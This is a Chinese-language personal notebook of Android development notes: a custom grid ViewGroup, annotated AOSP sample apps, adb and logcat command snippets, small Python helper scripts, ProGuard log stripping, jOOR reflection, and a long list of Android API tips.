import android.view.ViewDebug;

public class FixedGridLayout extends ViewGroup {
    int mCellWidth;
    int mCellHeight;

    public FixedGridLayout(Context context) {
        super(context);
    }

    public FixedGridLayout(Context context, AttributeSet attrs) {
        super(context, attrs);

        // Read the resource attributes.
        TypedArray a = context.obtainStyledAttributes(
                attrs, R.styleable.FixedGridLayout);
        mCellWidth = a.getDimensionPixelSize(
                R.styleable.FixedGridLayout_cellWidth, -1);
        mCellHeight = a.getDimensionPixelSize(
                R.styleable.FixedGridLayout_cellHeight, -1);
        a.recycle();
    }

    public void setCellWidth(int px) {
        mCellWidth = px;
        requestLayout();
    }

    public void setCellHeight(int px) {
        mCellHeight = px;
        requestLayout();
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        int cellWidthSpec = MeasureSpec.makeMeasureSpec(mCellWidth,
                MeasureSpec.AT_MOST);
        int cellHeightSpec = MeasureSpec.makeMeasureSpec(mCellHeight,
                MeasureSpec.AT_MOST);

        int count = getChildCount();
        for (int index=0; index<count; index++) {
            final View child = getChildAt(index);
            child.measure(cellWidthSpec, cellHeightSpec);
        }
        // Use the size our parents gave us
        setMeasuredDimension(resolveSize(mCellWidth*count, widthMeasureSpec),
                resolveSize(mCellHeight*count, heightMeasureSpec));
    }

    @Override
    protected void onLayout(boolean changed, int l, int t, int r, int b) {
        int cellWidth = mCellWidth;
        int cellHeight = mCellHeight;
        int columns = (r - l) / cellWidth;
        if (columns < 0) {
            columns = 1;
        }
        int x = 0;
        int y = 0;
        int i = 0;
        int count = getChildCount();
        for (int index=0; index<count; index++) {
            final View child = getChildAt(index);

            int w = child.getMeasuredWidth();
            int h = child.getMeasuredHeight();

            int left = x + ((cellWidth-w)/2);
            int top = y + ((cellHeight-h)/2);

            child.layout(left, top, left+w, top+h);
            if (i >= (columns-1)) {
                // advance to next row
                i = 0;
                x = 0;
                y += cellHeight;
            } else {
                i++;
                x += cellWidth;
            }
        }
    }
}

比较简单的自定义ViewGroup
onMeasure
onLayout
```

## [深度解析] development/samples/AdaptiveIconSample

```text
development/samples/AdaptiveIconSample/res/mipmap-anydpi/ic_launcher1.xml
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@mipmap/icon_back_1"/>
    <foreground>
        <bitmap android:src="@mipmap/icon_fore_1"/>
    </foreground>
</adaptive-icon>

development/samples/AdaptiveIconSample/res/mipmap-anydpi/ic_launcher1.xml
<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
    <background android:drawable="@color/background" />
    <foreground android:drawable="@mipmap/icon_fore_1"/>
</adaptive-icon>

使用方法:
<activity
    android:name="Activity1"
    android:icon="@mipmap/ic_launcher1"
    android:label="Icon 1">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
<activity
    android:name="Activity2"
    android:icon="@mipmap/ic_launcher2"
    android:label="Icon 2">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>

TODO : 背景为什么是圆的？在系统中怎么控制？
```

## [深度解析] development/samples/AliasActivity

```text
AndroidManifest.xml
<application android:hasCode="false" android:label="@string/app_label">
    <activity android:name="android.app.AliasActivity">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
        <meta-data android:name="android.app.alias"
                android:resource="@xml/alias" />
    </activity>
</application>

development/samples/AliasActivity/res/xml/alias.xml
<alias xmlns:android="http://schemas.android.com/apk/res/android">
    <intent android:action="android.intent.action.VIEW"
        android:data="http://www.google.com/">
    </intent>
</alias>

frameworks/base/core/java/android/app/AliasActivity.java
public class AliasActivity extends Activity {
    public final String ALIAS_META_DATA = "android.app.alias";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        XmlResourceParser parser = null;
        try {
            ActivityInfo ai = getPackageManager().getActivityInfo(getComponentName(), PackageManager.GET_META_DATA);
            parser = ai.loadXmlMetaData(getPackageManager(), ALIAS_META_DATA);
            if (parser == null) {
                throw new RuntimeException("Alias requires a meta-data field " + ALIAS_META_DATA);
            }
            Intent intent = parseAlias(parser);
            if (intent == null) {
                throw new RuntimeException("No <intent> tag found in alias description");
            }
            startActivity(intent);
            finish();
        } catch (PackageManager.NameNotFoundException e) {
            throw new RuntimeException("Error parsing alias", e);
        } catch (XmlPullParserException e) {
            throw new RuntimeException("Error parsing alias", e);
        } catch (IOException e) {
            throw new RuntimeException("Error parsing alias", e);
        } finally {
            if (parser != null) parser.close();
        }
    }
    /** 解析 android:resource="@xml/alias" 文件 */
    private Intent parseAlias(XmlPullParser parser) throws XmlPullParserException, IOException {
        AttributeSet attrs = Xml.asAttributeSet(parser);
        Intent intent = null;
        int type;
        while ((type=parser.next()) != XmlPullParser.END_DOCUMENT && type != XmlPullParser.START_TAG) {
        }
        String nodeName = parser.getName();
        if (!"alias".equals(nodeName)) {
            throw new RuntimeException("Alias meta-data must start with <alias> tag; found" + nodeName + " at " + parser.getPositionDescription());
        }
        int outerDepth = parser.getDepth();
        while ((type=parser.next()) != XmlPullParser.END_DOCUMENT && (type != XmlPullParser.END_TAG || parser.getDepth() > outerDepth)) {
            if (type == XmlPullParser.END_TAG || type == XmlPullParser.TEXT) {
                continue;
            }
            nodeName = parser.getName();
            if ("intent".equals(nodeName)) {
                Intent gotIntent = Intent.parseIntent(getResources(), parser, attrs);
                if (intent == null) intent = gotIntent;
            } else {
                XmlUtils.skipCurrentTag(parser);
            }
        }
        return intent;
    }
}

android_app {
    name: "AliasActivity",
    installable: false,     //TODO : 这个啥意思?有什么用?还是可以安装的呀?
    srcs: ["**/*.java"] ,
    sdk_version: "current",
    dex_preopt: {
        enabled: false,
    },
}

TODO :
android:hasCode="false"
这个demo中没有一个java文件
```

## [深度解析] development/samples/apkcachetest

```text
File preloadsFileCache = getPreloadsFileCache();
TextView txt = (TextView) findViewById(R.id.text);
if (!getApplicationInfo().isPrivilegedApp()) {                  //只有 /system/priv-app 的 app 才能访问 /data/preloads/file_cache/xx.yy.zz 中的文件?
    txt.append("WARNING: App must be installed in /system/priv-app directory to access " + "preloads cache\n");
}
txt.append("PreloadsFileCache app directory: " + preloadsFileCache + '\n');
if (!preloadsFileCache.exists()) {
    txt.append("   --- Directory does not exist ---\n");
} else {
    File[]  files = preloadsFileCache.listFiles();
    if (files == null || files.length == 0) {
        txt.append("   --- No files found ---\n");
    } else {
        for (File file : files) {
            try {
                txt.append("   " + file.getName() + ": [" + readTextFile(file) + "] \n");
            } catch (IOException e) {
                txt.append("   " + file.getName() + ": Error " + e + "\n");
                e.printStackTrace();
            }
        }
        txt.append(files.length + " files");
    }
}

只有 /system/priv-app 的 app 才能访问 /data/preloads/file_cache/xx.yy.zz 中的文件，cache 中的文件是怎么生成的？
```

## [深度解析] development/samples/AppNavigation

```text
<activity android:name=".app.AppNavHomeActivity"
        android:label="@string/app_nav_home_label">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
    </intent-filter>
</activity>

<activity android:name=".app.SimpleUpActivity"
          android:label="@string/simple_up_label"
          android:parentActivityName=".app.AppNavHomeActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.SAMPLE_CODE" />
    </intent-filter>
    <meta-data android:name="android.support.PARENT_ACTIVITY"
               android:value=".app.AppNavHomeActivity" />
</activity>

TODO : 关键代码
android:parentActivityName=".app.AppNavHomeActivity"
<meta-data android:name="android.support.PARENT_ACTIVITY" android:value=".app.AppNavHomeActivity" />
```

## 运行 android test case

```text
nn HelloActivityTests

ii out/target/product/s9863a1h10_go_32b/testcases/HelloActivityTests/arm/HelloActivityTests.apk

adb shell am instrument -w <test_package_name>/<runner_class>

adb shell am instrument -w com.example.android.helloactivity.tests
```

## [CMD] screenrecord

```text
adb shell screenrecord /sdcard/test.mp4
adb shell screenrecord --size 720x1080 /sdcard/test.mp4
adb shell screenrecord --bit-rate 10000000 /sdcard/test.mp4
adb shell screenrecord --time-limit 120 /sdcard/test.mp4
adb shell screenrecord --bugreport /sdcard/test.mp4
```

## [CMD] date

```text
adb shell date -s $(date +"%Y%m%d.%H%M%S")
adb shell date 08281319
```

## [CMD] printenv

```text
adb shell printenv
```

## [CMD] pull当前的apk

```text
adb shell dumpsys activity activities | grep apk | sed -e 's/ *baseDir=//g' | peco | xargs adb pull

TODO : peco 是啥？
sudo apt-get install peco
or
sudo snap install peco
```

## Canonical路径(规范路径)

```text
规范路径是从文件系统的根目录到当前文件的唯一的路径。
规范路径不像绝对路径那样有多个不同的值指向同一文件。
规范路径是绝对路径，但是绝对路径不一定是规范路径。
规范路径中移除了.和..等特殊字符
```

## [知识点] URL中的井号

```text
URL 是我们进行网络活动中很重要的概念，一个URL中可以包含域名，路径和参数等，

一个典型的 URL
https://www.example.com/fruits.html?from=google#apple
这其中包含了

协议： https
域名: www.example.com
路径文件名: fruits.html
参数: from=google
片段： apple
#片段是什么
URL 中的 # 指的是一个片段
URL 片段 往往用来告知浏览器约定的一个滑动位置
如果一个 URL 指向了一个文档，那么片段指向的就是文档的某个内容区间。
# 作用范围
会被本地浏览器处理
不会被服务器端接收处理
所以
www.example.com/fruits.html#apple
www.example.com/fruits.html#orange
对应的情况是

对于浏览器，上面的链接指向同一文档，但是具有不同的滑动位置
对于服务器，上面的链接指向同一文档，没有其他信息了。
# 还能怎么用
考虑到在浏览器可以获取片段信息，我们可以利用 Javascript做一些事情
网页应用可以使用片段来实现参数控制，做到不刷新页面，展示不同的内容
如下为 JavaScript获取片段的示例代码

window.location.hash
SEO 的影响
基于上面的理解，www.example.com/fruits.html#apple和www.example.com/fruits.html#orange 会被搜索引擎当成一个链接。

如果不想被搜索引擎如上处理，有两种方式

使用不同的网页链接如www.example.com/fruits_apple.html和www.example.com/fruits_orange.html
使用#!，即www.example.com/fruits.html#!apple和www.example.com/fruits.html#!orange 这种方式，可能只是Google 支持，其他搜索引擎待验证。
```

## [CMD] 用来查看当我们使用git add之后的内容的差异

```text
git diff --cached
```

## 在 Android 中如何确定 App(Activity) 的启动者

```text
adb logcat | grep -E "ActivityTaskManager: START"
or
adb logcat | grep -E "ActivityManager: START"

02-02 12:38:37.285  2968 15144 I ActivityTaskManager: START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER]  flg=0x10200000 cmp=com.android.camera2/com.android.camera.CameraActivity bnds=[561,1277]  [695,1437] } from uid 10112, pid 9152

from uid 10112 就是启动者的uid

adb shell id 10112
uid=10112(u0_a112) gid=10112(u0_a112) groups=10112(u0_a112) context=u:r:su:s0

adb shell ps | grep "u0_a112"
u0_a112        9152    378 1028088  80380 SyS_epoll_wait      0 S com.android.launcher3

u0_a112 的含义
u0 默认的手机第一个用户（可以通过设置里面的多用户新增和切换）
a 代表app
112 代表着第112个应用

简单而言，对应的公式是这样
u0_a70 = “u0_” + “a” + (uid(这里是10070) – FIRST_APPLICATION_UID(固定值10000))

具体复杂的转换，请参考这段代码
/**
 * Generate a text representation of the uid, breaking out its individual
 * components -- user, app, isolated, etc.
 * @hide
 */
public static void formatUid(StringBuilder sb, int uid) {
    if (uid < Process.FIRST_APPLICATION_UID) {
        sb.append(uid);
    } else {
        sb.append('u');
        sb.append(getUserId(uid));
        final int appId = getAppId(uid);
        if (isIsolated(appId)) {
            if (appId > Process.FIRST_ISOLATED_UID) {
                sb.append('i');
                sb.append(appId - Process.FIRST_ISOLATED_UID);
            } else {
                sb.append("ai");
                sb.append(appId - Process.FIRST_APP_ZYGOTE_ISOLATED_UID);
            }
        } else if (appId >= Process.FIRST_APPLICATION_UID) {
            sb.append('a');
            sb.append(appId - Process.FIRST_APPLICATION_UID);
        } else {
            sb.append('s');
            sb.append(appId);
        }
    }
}

/**
 * Defines the start of a range of UIDs (and GIDs), going from this
 * number to {@link #LAST_APPLICATION_UID} that are reserved for assigning
 * to applications.
 */
public static final int FIRST_APPLICATION_UID = 10000;
/**
 * Last of application-specific UIDs starting at
 * {@link #FIRST_APPLICATION_UID}.
 */
public static final int LAST_APPLICATION_UID = 19999;
/**
 * First uid used for fully isolated sandboxed processes (with no permissions of their own)
 * @hide
 */
@UnsupportedAppUsage
@TestApi
public static final int FIRST_ISOLATED_UID = 99000;
/**
 * First uid used for fully isolated sandboxed processes spawned from an app zygote
 * @hide
 */
@TestApi
public static final int FIRST_APP_ZYGOTE_ISOLATED_UID = 90000;
```

## 一种检测在主线程中执行耗时任务的简单方法

```text
public void checkWorkerThread() {
    boolean isMainThread = Looper.myLooper() == Looper.getMainLooper();
    if (isMainThread) {
        if (BuildConfig.DEBUG) {
            throw new RuntimeException("Do not do time-consuming work in the Main thread");
        }
    }
}
主线程判断，使用Looper.myLooper() == Looper.getMainLooper()可以准确判断当前线程是否为主线程。
BuildConfig.DEBUG 条件控制，只有在debug环境下抛出异常，给予开发者明显的提示。当然也可以使用自定义的是否抛出异常的逻辑
如果当前线程不是主线程，那么就被认为是工作者线程。

private void writeContentToFile() {
    checkWorkerThread();
    //代码省略，具体实现参考上面
    ......
}
```

## 编译期屏蔽Log

```text
既然运行时屏蔽存在问题，那么是否可以提前到编译期进行屏蔽呢，答案是肯定的。这里我们就使用了Proguard的一个小功能。

assumenosideeffects从英文单词上去理解，意思为 假设没有副作用。该功能属于优化的一种方式，该功能常常用来处理日志打印，比如我们想要屏蔽掉来自DroidLog的日志打印。 在混淆的配置文件中，加入下列代码

-assumenosideeffects class com.droidyue.logdemo.DroidLog {
    public static *** i(...);
}
然而仅仅处理DroidLog是不够的，因为我们无法保证团队其他成员是否使用了原生的android.utils.Log来进行日志打印（尽管有编码约束）

-assumenosideeffects class android.util.Log {
    public static *** d(...);
    public static *** e(...);
    public static *** i(...);
    public static *** v(...);
    public static *** println(...);
    public static *** w(...);
    public static *** wtf(...);
}

无论是运行时日志屏蔽还是编译期，message参数上发生的字符串拼接都依然存在。但是编译期屏蔽减少了方法调用（即方法进出栈操作），理论上编译期屏蔽日志更优。
```

## Java反射库jOOR的使用方法

```text
创建实例
String string = Reflect.on(String.class).create("Hello World").get();

访问属性（public,protected,package,private均可）
char pathSeparatorChar = Reflect.on(File.class).create("/sdcard/droidyue.com").field("pathSeparatorChar").get();

修改属性(final属性也可以修改)
String setValue = Reflect.on(File.class).create("/sdcard/drodiyue.com").set("path", "fakepath").get("path");

调用方法（public,protected,package,private均可）
ArrayList arrayList = new ArrayList();
arrayList.add("Hello");
arrayList.add("World");
int value = Reflect.on(arrayList).call("hugeCapacity", 12).get();

原理
public Map<String, Reflect> fields() {
    Map<String, Reflect> result = new LinkedHashMap<String, Reflect>();
    Class<?> type = type();
    do {
        for (Field field : type.getDeclaredFields()) {
            if (!isClass ^ Modifier.isStatic(field.getModifiers())) {
                String name = field.getName();

            if (!result.containsKey(name))
              result.put(name, field(name));
            }
        }

        type = type.getSuperclass();
    } while (type != null);

    return result;
}

https://github.com/jOOQ/jOOR

最新的方法可能有变化，可以直接查看以上的开源库中的说明文档
```

## [CMD] logcat打印关键log

```text
adb logcat | grep --color=always -E "System.err|AndroidRuntime|MessageQueue|CONSOLE|W/Bundle|dalvikvm|StrictMode"
```

## [CMD] 打印某个应用的日志

```text
#!/usr/bin/env python
#coding:utf-8
#This script is aimed to grep logs by application(User should input a packageName and then we look up for the process ids then separate logs by process ids).

import os
import sys

packageName=str(sys.argv[1] )

command = "adb shell ps | grep %s | awk '{print $2}'"%(packageName)
p = os.popen(command)
##for some applications,there are multiple processes,so we should get all the process id
pid = p.readline().strip()
filters = pid
while(pid != ""):
    pid = p.readline().strip()
    if (pid != ''):
        filters = filters +  "|" + pid
        #print 'command = %s;filters=%s'%(command, filters)
if (filters != '') :
    cmd = 'adb logcat | grep --color=always -E "%s" '%(filters)
    os.system(cmd)
```

## [CMD] git push脚本

```text
#!/usr/bin/env python
# coding=utf-8
from subprocess import Popen,PIPE,STDOUT
from os import system

def gpush():
    branchColorRule = readFromShell('git config color.branch')
    if ('always' == branchColorRule):
        system('git config color.branch auto')

    getBranch = "git branch | sed -n '/\* /s///p'"
    gitBranch = readFromShell(getBranch)
    command = 'git push origin %s'%(gitBranch)
    print command
    system(command)
    if ('always' == branchColorRule):
        system('git config color.branch always')


def readFromShell(command):
    p = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
    result = p.stdout.read().strip()
    return result

gpush()
```

## [知识点] Android小技巧

```text
getParent().requestDisallowInterceptTouchEvent(true);剥夺父view 对touch 事件的处理权，谁用谁知道。
ArgbEvaluator.evaluate(float fraction, Object startValue, Object endValue); 用于根据一个起始颜色值和一个结束颜色值以及一个偏移量生成一个新的颜色，分分钟实现类似于微信底部栏滑动颜色渐变。
Canvas中clipRect、clipPath和clipRegion 剪切区域的API。
Bitmap.extractAlpha ();返回一个新的Bitmap，capture原始图片的alpha 值。有的时候我们需要动态的修改一个元素的背景图片又不希望使用多张图片的时候，通过这个方法，结合Canvas 和Paint 可以动态的修改一个纯色Bitmap的颜色。
HandlerThread，代替不停new Thread 开子线程的重复体力写法。
IntentService,一个可以干完活后自己去死且不需要我们去管理子线程的Service。
Palette，5.0加入的可以提取一个Bitmap 中突出颜色的类，结合上面的Bitmap.extractAlpha，你懂的。
Executors. newSingleThreadExecutor();这个是java 的，之前不知道它，自己花很大功夫去研究了单线程顺序执行的任务队列。。
android:animateLayoutChanges=”true”，LinearLayout中添加View 的动画的办法，支持通过setLayoutTransition()自定义动画。
GradientDrawable，之前接手公司的项目，发现有个阴影效果还不错，以为是切的图片，一看代码，什么鬼= =！
AsyncQueryHandler，如果做系统工具类的开发，比如联系人短信辅助工具等，肯定免不了和ContentProvider打交道，如果数据量不是很大的情况下，随便搞，如果数据量大的情况下，了解下这个类是很有必要的，需要注意的是，这玩意儿吃异常..
ViewFlipper，实现多个view的切换(循环)，可自定义动画效果，且可针对单个切换指定动画。
有朋友提到了在自定义View时有些方法在开启硬件加速的时候没有效果的问题，在API16之后确实有很多方法不支持硬件加速，通常我们关闭硬件加速都是在清单文件中通过，其实android也提供了针对特定View关闭硬件加速的方法,调用View.setLayerType(View.LAYER_TYPE_SOFTWARE, null);即可。
android util包中的Pair类，可以方便的用来存储一”组”数据。注意不是key value。
PointF，graphics包中的一个类，我们经常见到在处理Touch事件的时候分别定义一个downX，一个downY用来存储一个坐标，如果坐标少还好，如果要记录的坐标过多那代码就不好看了。用PointF(float x, float y);来描述一个坐标点会清楚很多。
StateListDrawable，定义Selector通常的办法都是xml文件，但是有的时候我们的图片资源可能是从服务器动态获取的，比如很多app所谓的皮肤，这种时候就只能通StateListDrawable 来完成了，各种addState即可。

android:descendantFocusability，ListView的item中CheckBox等元素抢焦点导致item点击事件无法响应时，除了给对应的元素设置 focusable,更简单的是在item根布局加上android:descendantFocusability=”blocksDescendants”
android:duplicateParentState=”true”，让子View跟随其Parent的状态，如pressed等。常见的使用场景是某些时候一个按钮很小，我们想要扩大其点击区域的时候通常会再给其包裹一层布局，将点击事件写到Parent上，这时候如果希望被包裹按钮的点击效果对应的Selector继续生效的话，这时候duplicateParentState就派上用场了。
includeFontPadding=”false”，TextView默认上下是有一定的padding的，有时候我们可能不需要上下这部分留白，加上它即可。
Messenger，面试的时候通常都会被问到进程间通信，一般情况下大家都是开始背书，AIDL巴拉巴拉。。有一天在鸿神的博客看到这个，嗯，如他所说，又可以装一下了。
ViewConfiguration.getScaledTouchSlop();触发移动事件的最小距离，自定义View处理touch事件的时候，有的时候需要判断用户是否真的存在movie，系统提供了这样的方法。
ValueAnimator.reverse(); 顺畅的取消动画效果。
ViewStub，有的时候一块区域需要根据情况显示不同的布局，通常我们都会通过setVisibility的方法来显示和隐藏不同的布局，但是这样默认是全部加载的，用ViewStub可以更好的提升性能。
onTrimMemory，在Activity中重写此方法，会在内存紧张的时候回调（支持多个级别），便于我们主动的进行资源释放，避免OOM。
EditTxt.setImeOptions， 使用EditText弹出软键盘时，修改回车键的显示内容(一直很讨厌用回车键来交互，所以之前一直不知道这玩意儿)
WeakHashMap，直接使用HashMap有时候会带来内存溢出的风险，使用WaekHashMap实例化Map。当使用者不再有对象引用的时候，WeakHashMap将自动被移除对应Key值的对象。
1、Throwable接口中的getStackTrace()方法（或者Thread类的getStackTrace()方法），根据这个方法可以得到函数的逐层调用地址，其返回值为StackTraceElement[] ；
2、StackTraceElement类，其中四个方法getClassName()，getFileName()，getLineNumber()，getMethodName()在调试程序打印Log时非常有用；
5、View中的isShown()方法，以前都是用view.getVisibility() == View.VISIBLE来判断的(╯□╰)；（谢评论提醒，这里面其实有一个坑：【android】view.isShown ()的用法）
6、Arrays类中的一系列关于数组操作的工具方法：binarySearch()，asList()，equals()，sort()，toString()，copyOfRange()等； Collections类中的一系列关于集合操作的工具方法：sort()，reverse()等；
7、android.text.format.Formatter类中formatFileSize(Context, long)方法，用来格式化文件Size（B → KB → MB → GB）；
8、android.media.ThumbnailUtils类，用来获取媒体（图片、视频）缩略图；
10、View类中的三个方法：callOnClick()，performClick()，performLongClick()，用于触发View的点击事件；
12、TextView类中的append(CharSequence)方法，添加文本。一些特殊文本直接用+连接会变成String；
13、View类中的getDrawingCache()等一系列方法，目前只知道可以用来截图；
14、DecimalFormat类，用于字串格式化包括指定位数、百分数、科学计数法等；
15、System类中的arraycopy(src, srcPos, dest, destPos, length)方法，用来copy数组；
16、Fragment类中的onHiddenChanged(boolean)方法，使用FragmentTransaction中的hide()，show()时貌似Fragment的其它生命周期方法都不会被调用，太坑爹！
17、Activity类中的onWindowFocusChanged(boolean)，onNewIntent(intent)等回调方法；
18、View类中的getLocationInWindow(int[] )方法和getLocationOnScreen(int[] )方法，获取View在窗口/屏幕中的位置；
19、TextView类中的setTransformationMethod(TransformationMethod)方法，可用来实现“显示密码”功能；
20、TextWatcher接口，用来监听文本输入框内容的改变，可用来实现一系列具有特殊功能的文本输入框；
22、Surface设置透明：SurfaceView.setZOrderOnTop(true); SurfaceView.getHolder().setFormat(PixelFormat.TRANSLUCENT);但是会挡住其它控件；
23、ListView或GridView类中的setFastScrollEnabled(boolean)方法，用来设置快速滚动滑块是否可见，当然前提是item够多；
24、PageTransformer接口，用来自定义ViewPager页面切换动画，用setPageTransformer(boolean, PageTransformer)方法来进行设置；
25、apache提供的一系列jar包：commons-lang.jar，commons-collections.jar，commons-beanutils.jar等，里面很多方法可能是你曾经用几十几百行代码实现过的，但是执行效率或许要差很多，比如：ArrayUtils，StringUtils……；
26、AndroidTestCase类，Android单元测试，在AndroidStudio中使用非常方便；
27、TextView类的setKeyListener(KeyListener)方法； 其中DigitsKeyListener类，使用getInstance(String accepted)方法即可指定EditText可输入字符集；
28、ActivityLifecycleCallbacks接口，用于在Application类中监听各Activity的状态变化；
29、Context类中的createPackageContext(packageName, flags)方法，可用来获取指定包名应用程序的Context对象。

Activity.startActivities() 常用于在应用程序中间启动其他的Activity。
Build.VERSION_CODES 这个标明了当前的版本号,在处理兼容性问题的时候经常会用到.点进去可以看到各个版本的不同特性。
Log.getStackTraceString() 方便的日志类工具,方法Log.v()、Log.d()、Log.i()、Log.w()和Log.e()都是将信息打印到LogCat中，有时候需要将出错的信息插入到数据库或一个自定义的日志文件中，那么这种情况就需要将出错的信息以字符串的形式返回来，也就是使用static String getStackTraceString(Throwable tr)方法的时候。
LayoutInflater.from() 顾名思义,用于Inflate一个layout,参数是layout的id.这个经常写Adapter的人会用的比较多。
ViewConfiguration.getScaledTouchSlop() 使用 ViewConfiguration 中提供的值以保证所有触摸的交互都是统一的。这个方法获取的值表示:用户的手滑动这个距离后,才判定为正在进行滑动.当然这个值也可以自己来决定.但是为了一致性,还是使用标准的值较好。
PhoneNumberUtils.convertKeypadLettersToDigits 顾名思义.将字母转换为数字,类似于T9输入法,
Context.getCacheDir() 获取缓存数据文件夹的路径,很简单但是知道的人不多,这个路径通常在SD卡上(这里的SD卡指的是广义上的SD卡,包括外部存储和内部存储)Adnroid/data/您的应用程序包名/cache/ 下面.测试的时候,可以去这里面看是否缓存成功.缓存在这里的好处是:不用自己再去手动创建文件夹,不用担心用户把自己创建的文件夹删掉,在应用程序卸载的时候,这里会被清空,使用第三方的清理工具的时候,这里也会被清空。
ArgbEvaluator 用于处理颜色的渐变。就像 Chris Banes 说的一样，这个类会进行很多自动装箱的操作，所以最好还是去掉它的逻辑自己去实现它。这个没用过,不明其所以然,回头再补充.
ContextThemeWrapper 方便在运行的时候修改主题。

DateUtils.formatDateTime() 用来进行区域格式化工作，输出格式化和本地化的时间或者日期。
AlarmManager.setInexactRepeating 通过闹铃分组的方式省电，即使你只调用了一个闹钟，这也是一个好的选择，（可以确保在使用完毕时自动调用 AlarmManager.cancel ()。原文说的比较抽象，这里详细说一下:setInexactRepeating指的是设置非准确闹钟，使用方法:alarmManager.setInexactRepeating(AlarmManager.RTC， startTime，intervalL， pendingIntent)，非准确闹钟只能保证大致的时间间隔，但是不一定准确，可能出现设置间隔为30分钟，但是实际上一次间隔20分钟，另一次间隔40分钟。它的最大的好处是可以合并闹钟事件，比如间隔设置每30分钟一次，不唤醒休眠，在休眠8小时后已经积累了16个闹钟事件，而在手机被唤醒的时候，非准时闹钟可以把16个事件合并为一个， 所以这么看来，非准时闹钟一般来说比较节约能源。
Linkify.addLinks() 在Text上添加链接。很实用。
StaticLayout 在自定义 View 中渲染文字的时候很实用。
DrawFilter 可以让你在不调用onDrew方法的情况下，操作canvas，比了个如，你可以在创建自定义 View 的时候设置一个 DrawFilter，给父 View 里面的所有 View 设置反别名。
ActivityManager.getMemoryClass() 告诉你你的机器还有多少内存，在计算缓存大小的时候会比较有用。
ViewStub 它是一个初始化不做任何事情的 View，但是之后可以载入一个布局文件。在慢加载 View 中很适合做占位符。唯一的缺点就是不支持标签，所以如果你不太小心的话，可能会在视图结构中加入不需要的嵌套。
DisplayMetrics.density 这个方法你可以获取设备像素密度，大部分时候最好让系统来自动进行缩放资源之类的操作，但是有时候控制的效果会更好一些.(尤其是在自定义View的时候)。
Pair.create() 方便构建类和构造器的方法。

UrlQuerySanitizer——使用这个工具可以方便对 URL 进行检查。
Fragment.setArguments——因为在构建 Fragment 的时候不能加参数，所以这是个很好的东西，可以在创建 Fragment 之前设置参数（即使在 configuration 改变的时候仍然会导致销毁/重建）。
DialogFragment.setShowsDialog ()—— 这是一个很巧妙的方式，DialogFragment 可以作为正常的 Fragment 显示！这里可以让 Fragment 承担双重任务。我通常在创建 Fragment 的时候把 onCreateView ()和 onCreateDialog ()都加上，就可以创建一个具有双重目的的 Fragment。
FragmentManager.enableDebugLogging ()——在需要观察 Fragment 状态的时候会有帮助。
LocalBroadcastManager——这个会比全局的 broadcast 更加安全，简单，快速。像 otto 这样的 Event buses 机制对你的应用场景更加有用。
PhoneNumberUtils.formatNumber ()——顾名思义，这是对数字进行格式化操作的时候用的。
Region.op()——我发现在对比两个渲染之前的区域的时候很实用，如果你有两条路径，那么怎么知道它们是不是会重叠呢？使用这个方法就可以做到。
Application.registerActivityLifecycleCallbacks——虽然缺少官方文档解释，不过我想它就是注册 Activity 的生命周期的一些回调方法（顾名思义），就是一个方便的工具。
versionNameSuffix——这个 gradle 设置可以让你在基于不同构建类型的 manifest 中修改版本名这个属性，例如，如果需要在在 debug 版本中以”-SNAPSHOT”结尾，那么就可以轻松的看出当前是 debug 版还是 release 版。
CursorJoiner——如果你是只使用一个数据库的话，使用 SQL 中的 join 就可以了，但是如果收到的数据是来自两个独立的 ContentProvider，那么 CursorJoiner 就很实用了。
-nodpi——在没有特别定义的情况下，很多修饰符(-mdpi,-hdpi,-xdpi等等)都会默认自动缩放 assets/dimensions，有时候我们需要保持显示一致，这种情况下就可以使用 -nodpi。
BroadcastRecevier.setDebugUnregister ()——又一个方便的调试工具。
Activity.recreate ()——强制让 Activity 重建。
PackageManager.checkSignatures ()——如果同时安装了两个 app 的话，可以用这个方法检查。如果不进行签名检查的话，其他人可以轻易通过使用一样的包名来模仿你的 app。

Activity.isChangingConfigurations ()——如果在 Activity 中 configuration 会经常改变的话，使用这个方法就可以不用手动做保存状态的工作了。
SearchRecentSuggestionsProvider——可以创建最近提示效果的 provider，是一个简单快速的方法。
ViewTreeObserver——这是一个很棒的工具。可以进入到 VIew 里面，并监控 View 结构的各种状态，通常我都用来做 View 的测量操作（自定义视图中经常用到）。
org.gradle.daemon=true——这句话可以帮助减少 Gradle 构建的时间，仅在命令行编译的时候用到，因为 Android Studio 已经这样使用了。
DatabaseUtils——一个包含各种数据库操作的使用工具。
android:weightSum (LinearLayout)——如果想使用 layout weights，但是却不想填充整个 LinearLayout 的话，就可以用 weightSum 来定义总的 weight 大小。
android:duplicateParentState (View)——此方法可以使得子 View 可以复制父 View 的状态。比如如果一个 ViewGroup 是可点击的，那么可以用这个方法在它被点击的时候让它的子 View 都改变状态。
android:clipChildren (ViewGroup)——如果此属性设置为不可用，那么 ViewGroup 的子 View 在绘制的时候会超出它的范围，在做动画的时候需要用到。
android:fillViewport (ScrollView)——在这片文章中有详细介绍文章链接，可以解决在 ScrollView 中当内容不足的时候填不满屏幕的问题。
android:tileMode (BitmapDrawable)——可以指定图片使用重复填充的模式。
android:enterFadeDuration/android:exitFadeDuration (Drawables)——此属性在 Drawable 具有多种状态的时候，可以定义它展示前的淡入淡出效果。
android:scaleType (ImageView)——定义在 ImageView 中怎么缩放/剪裁图片，一般用的比较多的是“centerCrop”和“centerInside”。
Merge——此标签可以在另一个布局文件中包含别的布局文件，而不用再新建一个 ViewGroup，对于自定义 ViewGroup 的时候也需要用到；可以通过载入一个带有标签的布局文件来自动定义它的子部件。
